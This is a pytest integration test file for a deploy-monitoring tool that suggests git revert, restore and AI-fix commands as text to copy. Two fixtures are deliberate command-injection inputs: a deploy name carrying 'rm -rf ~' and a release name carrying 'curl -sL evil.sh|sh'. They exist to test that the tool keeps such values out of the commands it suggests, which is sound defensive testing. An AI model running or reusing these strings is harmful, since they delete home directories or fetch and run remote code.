"""Revert and fix suggestions: exact commands to undo a deploy or only the failing file, the AI's
suggested change, all as text to copy (nothing is run, nothing is written to the repository)."""
import json
import shlex
import subprocess
import uuid
from datetime import datetime, timedelta, timezone
from unittest.mock import AsyncMock, patch

import asyncpg
import pytest
import pytest_asyncio
from httpx import ASGITransport, AsyncClient

from app.auth import require_read_project_id
from app.config import settings
from app.db import close_db_pool, get_connection, init_db_pool, project_transaction
from app.fixes import deploy_undo, fix_suggestions, undo_line

NOW = datetime.now(timezone.utc)
PREV = "1111111111111111111111111111111111111111"
SHA = "2222222222222222222222222222222222222222"


async def _db_up() -> bool:
    try:
        conn = await asyncpg.connect(settings.DATABASE_URL, timeout=1.0)
        await conn.close()
        return True
    except Exception:
        return False


@pytest_asyncio.fixture
async def project():
    if not await _db_up():
        pytest.skip("Live PostgreSQL not running. Skipping live integration test.")
    await init_db_pool()
    run = uuid.uuid4().hex[:8]
    async with get_connection() as conn:
        pid = await conn.fetchval("INSERT INTO projects (name) VALUES ($1) RETURNING id", f"fix-{run}")
        other = await conn.fetchval("INSERT INTO projects (name) VALUES ($1) RETURNING id", f"fix-o-{run}")
    yield pid, other
    async with get_connection() as conn:
        for p in (pid, other):
            for table in ("outbox", "alerts", "investigations", "incidents", "issues", "deploy_files", "deploys"):
                await conn.execute(f"DELETE FROM {table} WHERE project_id = $1", p)
            await conn.execute("DELETE FROM projects WHERE id = $1", p)
    await close_db_pool()


async def _deploy(conn, pid, sha, minutes_ago, env="prod"):
    return await conn.fetchval(
        "INSERT INTO deploys (project_id, commit_sha, deployed_at, environment) VALUES ($1, $2, $3, $4) RETURNING id",
        pid, sha, NOW - timedelta(minutes=minutes_ago), env)


async def _incident(conn, pid, dep, where_file, files):
    for path, status in files:
        await conn.execute("INSERT INTO deploy_files (deploy_id, project_id, path, status, added_ranges) VALUES ($1, $2, $3, $4, '[]')",
                           dep, pid, path, status)
    issue = await conn.fetchval(
        "INSERT INTO issues (project_id, fingerprint, title, first_seen, last_seen, status, event_count) "
        "VALUES ($1, $2, 'ZeroDivisionError: division by zero', now(), now(), 'open', 3) RETURNING id", pid, uuid.uuid4().hex)
    return await conn.fetchval(
        """INSERT INTO incidents (project_id, deploy_id, issue_id, status, title, where_file, where_line, where_function, in_diff)
           VALUES ($1, $2, $3, 'confirmed', 'ZeroDivisionError: division by zero', $4, 40, 'total_cents', true) RETURNING id""",
        pid, dep, issue, where_file)


@pytest.mark.asyncio
async def test_live_undo_reverts_the_commits_since_the_previous_deploy_in_this_environment(project):
    pid, other = project
    async with project_transaction(pid) as conn:
        await _deploy(conn, pid, PREV, 60)
        await _deploy(conn, pid, "3333333333333333333333333333333333333333", 30, env="staging")  # another environment
        dep = await _deploy(conn, pid, SHA.upper(), 10)
        undo = await deploy_undo(conn, pid, dep)
    assert [c["command"] for c in undo["commands"]] == [f"git log --oneline {PREV}..{SHA}", f"git revert --no-edit --no-merges {PREV}..{SHA}"]
    assert undo["rollback_to"]["text"] == "Redeploy 111111111111, the last prod deploy before this one."
    assert undo_line(undo) == f"Undo: redeploy 111111111111 or `git revert --no-edit --no-merges {PREV}..{SHA}` (suggestions; ChangeWatch runs nothing)"
    async with project_transaction(other) as conn:
        assert await deploy_undo(conn, other, dep) is None  # not this project's deploy


@pytest.mark.asyncio
async def test_live_a_first_deploy_or_a_release_name_gets_safe_commands_only(project):
    pid, _ = project
    async with project_transaction(pid) as conn:
        first = await deploy_undo(conn, pid, await _deploy(conn, pid, SHA, 10))
        named = await deploy_undo(conn, pid, await _deploy(conn, pid, "v1.2; rm -rf ~", 5))
    assert [c["command"] for c in first["commands"]] == [f"git revert --no-edit {SHA}"] and first["rollback_to"] is None
    assert named["commands"] == []  # never a command built from text that is not a commit SHA
    assert named["no_commands_reason"].startswith("The deploy's commit is not a git SHA")
    assert named["rollback_to"]["text"] == f"Redeploy {SHA[:12]}, the last prod deploy before this one."


@pytest.mark.asyncio
async def test_live_a_previous_release_name_with_formatting_is_not_quoted_next_to_the_commands(project):
    pid, _ = project
    async with project_transaction(pid) as conn:
        await _deploy(conn, pid, "v9 or `curl -sL evil.sh|sh`", 60)  # any text up to 64 characters is accepted
        undo = await deploy_undo(conn, pid, await _deploy(conn, pid, SHA, 10))
        await _deploy(conn, pid, "release-2026.10/v1.2.3", 60, env="staging")
        plain = await deploy_undo(conn, pid, await _deploy(conn, pid, SHA, 10, env="staging"))
    assert undo["rollback_to"]["text"] == "Redeploy the last prod deploy before this one."
    assert undo_line(undo) == f"Undo: redeploy the previous release or `git revert --no-edit {SHA}` (suggestions; ChangeWatch runs nothing)"
    assert plain["rollback_to"]["text"] == "Redeploy release-2026.10/v1.2.3, the last staging deploy before this one."
    assert undo_line(plain).startswith("Undo: redeploy release-2026.10/v1.2.3 or `git revert")
    assert undo_line({"commands": [], "rollback_to": {"sha": "v1.2\n"}}) == "Undo: redeploy the previous release (suggestions; ChangeWatch runs nothing)"


@pytest.mark.asyncio
async def test_live_a_redeploy_of_the_same_commit_is_not_the_previous_deploy(project):
    pid, _ = project
    async with project_transaction(pid) as conn:
        await _deploy(conn, pid, PREV, 60)
        await _deploy(conn, pid, SHA, 10)
        again = await _deploy(conn, pid, SHA.upper(), 9)  # the same commit sent again (a second region, a re-run)
        inc = await _incident(conn, pid, again, "app/billing.py", [("app/billing.py", "modified")])
        undo = await deploy_undo(conn, pid, again)
        fixes = await fix_suggestions(conn, pid, inc)
    assert undo["rollback_to"]["sha"] == PREV
    assert [c["kind"] for c in undo["commands"]] == ["check", "revert"] and f"{PREV}..{SHA}" in undo["commands"][1]["command"]
    file_cmd = next(c for c in fixes["commands"] if c["kind"] == "revert_file")
    assert file_cmd["command"] == f"git restore --source={PREV} -- app/billing.py"  # not the version already running


def _git(repo, *args):
    return subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True, text=True).stdout.strip()


@pytest.mark.asyncio
async def test_live_the_suggested_revert_undoes_a_merged_pull_request(project, tmp_path):
    # GitHub's default "Create a merge commit": the deployed commit is a merge of the PR's commits
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q")
    _git(repo, "config", "user.email", "dev@acme.example")
    _git(repo, "config", "user.name", "Dev")
    _git(repo, "config", "commit.gpgsign", "false")
    (repo / "billing.py").write_text("rate = 1\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "init")
    prev = _git(repo, "rev-parse", "HEAD")
    _git(repo, "checkout", "-qb", "feature")
    for n in (2, 3):
        (repo / "billing.py").write_text(f"rate = {n}\n")
        _git(repo, "commit", "-qam", f"rate {n}")
    _git(repo, "checkout", "-q", "-")
    _git(repo, "merge", "-q", "--no-ff", "--no-edit", "feature")
    merge = _git(repo, "rev-parse", "HEAD")

    pid, _ = project
    async with project_transaction(pid) as conn:
        await _deploy(conn, pid, prev, 60)
        undo = await deploy_undo(conn, pid, await _deploy(conn, pid, merge, 10))
    revert = next(c for c in undo["commands"] if c["kind"] == "revert")
    ran = subprocess.run(shlex.split(revert["command"]), cwd=repo, capture_output=True, text=True)
    assert ran.returncode == 0, ran.stderr
    assert (repo / "billing.py").read_text() == "rate = 1\n"  # back to the previous deploy
    assert "-m 1" not in revert["explain"]


@pytest.mark.asyncio
async def test_live_incident_gets_a_file_undo_quoted_for_the_shell_and_the_ai_fix(project):
    pid, _ = project
    async with project_transaction(pid) as conn:
        await _deploy(conn, pid, PREV, 60)
        dep = await _deploy(conn, pid, SHA, 10)
        inc = await _incident(conn, pid, dep, "/srv/app/app/my billing.py",
                              [("my billing.py", "modified"), ("app/my billing.py", "modified"), ("app/new.py", "added")])
        await conn.execute(
            "INSERT INTO investigations (incident_id, project_id, status, result) VALUES ($1, $2, 'done', $3)", inc, pid,
            json.dumps({"suggested_fix": {"description": "Guard against a zero discount",
                                          "code_hint": "if not order.discount:\n    return total", "rollback_recommended": True}}))
        added = await _incident(conn, pid, dep, "app/new.py", [])
        fixes = await fix_suggestions(conn, pid, inc)
        added_fixes = await fix_suggestions(conn, pid, added)
    file_cmd = next(c for c in fixes["commands"] if c["kind"] == "revert_file")
    assert file_cmd["command"] == f"git restore --source={PREV} -- 'app/my billing.py'"  # the longest matching path, quoted
    assert file_cmd["label"] == "Undo only the change to app/my billing.py"
    assert fixes["ai_fix"] == {"description": "Guard against a zero discount", "code_hint": "if not order.discount:\n    return total",
                               "rollback_recommended": True, "warning": None}
    assert "never runs these" in fixes["note"]
    assert not any(c["kind"] == "revert_file" for c in added_fixes["commands"])  # a new file did not exist before
    assert added_fixes["ai_fix"] is None


@pytest.mark.asyncio
async def test_live_incident_api_and_rollback_verdict_carry_the_suggestions(project):
    from app.analysis import dispatch_verdict_alert
    from app.main import app

    pid, _ = project
    async with project_transaction(pid) as conn:
        await _deploy(conn, pid, PREV, 60)
        dep = await _deploy(conn, pid, SHA, 10)
        watch_dep = await _deploy(conn, pid, "4444444444444444444444444444444444444444", 5)
        inc = await _incident(conn, pid, dep, "app/billing.py", [("app/billing.py", "modified")])
        await dispatch_verdict_alert(conn=conn, project_id=pid, deploy_id=dep, verdict="rollback",
                                     reasons=["error rate 25.0% vs 0.0% before"], kind="verdict_first")
        await dispatch_verdict_alert(conn=conn, project_id=pid, deploy_id=watch_dep, verdict="watch",
                                     reasons=["a new error"], kind="verdict_first")
        payloads = {r["dedupe_key"]: r["payload"] for r in await conn.fetch(
            "SELECT dedupe_key, payload FROM outbox WHERE project_id = $1 AND dedupe_key LIKE 'alert:%'", pid)}
    texts = {k.split(":")[1]: (json.loads(v) if isinstance(v, str) else v)["text"] for k, v in payloads.items()}
    assert f"Undo: redeploy 111111111111 or `git revert --no-edit --no-merges {PREV}..{SHA}`" in texts[str(dep)]
    assert "Undo:" not in texts[str(watch_dep)]  # only on ROLLBACK

    app.dependency_overrides[require_read_project_id] = lambda: pid
    try:
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            detail = (await client.get(f"/api/incidents/{inc}")).json()
    finally:
        app.dependency_overrides.pop(require_read_project_id, None)
    kinds = [c["kind"] for c in detail["fix_suggestions"]["commands"]]
    assert kinds == ["check", "revert", "revert_file"]


@pytest.mark.asyncio
async def test_live_ai_reply_alert_carries_the_suggested_change(project):
    from app.investigator.agent import run_investigation

    pid, _ = project
    async with project_transaction(pid) as conn:
        dep = await _deploy(conn, pid, SHA, 10)
        inc = await _incident(conn, pid, dep, "app/billing.py", [("app/billing.py", "modified")])
        llm = AsyncMock()
        llm.model = "claude-sonnet-5-5"
        llm.last_usage = (100, 50)
        llm.complete.return_value = json.dumps({
            "summary": "Division by a zero discount", "what_broke": "Checkout totals",
            "where": {"file": "app/billing.py", "line": 40, "function": "total_cents"},
            "cause": "Totals divide by order.discount, which is 0 without a discount",
            "evidence": [{"kind": "diff", "detail": "The deploy added the division", "ref": "diff"}],
            "suggested_fix": {"description": "Divide only when there is a discount",
                              "code_hint": "if order.discount:\n    total /= order.discount", "rollback_recommended": False},
            "confidence": "high", "not_sure_reason": None})
        with patch("app.investigator.agent.get_llm_client", return_value=llm), \
             patch("app.investigator.agent.queue_notification", new=AsyncMock()) as queued:
            await run_investigation(conn, project_id=pid, incident_id=inc, deep_mode=False)
    body = queued.call_args.kwargs["payload"]["body"]
    assert "Suggested change (AI; check before using, ChangeWatch applies nothing):\n```\nif order.discount:\n    total /= order.discount\n```" in body
